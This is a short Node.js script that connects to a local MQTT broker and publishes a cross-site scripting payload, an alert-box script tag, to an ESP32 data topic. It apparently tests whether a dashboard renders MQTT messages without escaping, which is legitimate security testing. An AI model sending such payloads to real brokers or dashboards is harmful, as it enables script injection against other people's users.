const mqtt = require('mqtt');

const client = mqtt.connect('mqtt://localhost:1883');

client.on('connect', () => {
    console.log('Connected to MQTT');

    // 💀 XSS payload
    client.publish('esp32/data', '<script>alert("Hacked!")</script>');

    console.log('Payload sent!');
    client.end();
});